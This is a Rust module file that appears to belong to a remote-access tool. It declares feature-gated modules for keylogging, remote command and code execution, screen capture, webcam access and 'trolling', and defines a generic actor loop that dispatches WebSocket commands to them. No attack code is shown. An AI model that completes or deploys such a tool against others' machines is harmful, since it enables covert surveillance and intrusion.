use async_trait::async_trait;
use tokio::sync::mpsc;

use tokio_tungstenite::tungstenite::Message;

pub mod audio;
#[cfg(feature = "chat")]
pub mod chat;
#[cfg(feature = "files")]
pub mod file_system;
#[cfg(feature = "keylogger")]
pub mod keylogger;
#[cfg(feature = "remote_cmd")]
pub mod remote_cmd;
#[cfg(feature = "remote_code_execution")]
pub mod remote_code_execution;
#[cfg(feature = "remote_screen")]
pub mod remote_screen;
#[cfg(feature = "task_manager")]
pub mod task_manager;
#[cfg(feature = "trolling")]
pub mod trolling;
#[cfg(feature = "webcam")]
pub mod webcam;

pub type Command = serde_json::Value;
pub type HandlerResult = anyhow::Result<()>;
// pub type _SocketWriter = SplitSink<WebSocketStream<MaybeTlsStream<TcpStream>>, Message>;
pub type WsMessageSender = mpsc::Sender<Message>;
// pub type ArcMutexSocketWriter = Arc<Mutex<SocketWriter>>;

#[async_trait]
pub trait Actor {
    fn new() -> Self
    where
        Self: Sized;
    async fn handler(&mut self, command: Command, writer: WsMessageSender) -> HandlerResult;
}

pub fn run_actor<ActorGenerique: Actor + Send + 'static>(
    mut receiver: mpsc::Receiver<Command>,
    writer: WsMessageSender,
) {
    let mut actor_state = ActorGenerique::new();

    tokio::spawn(async move {
        while let Some(command) = receiver.recv().await {
            if let Err(e) = actor_state.handler(command, writer.clone()).await {
                eprintln!("Actor handler error: {:?}", e);
            }
        }
    });
}
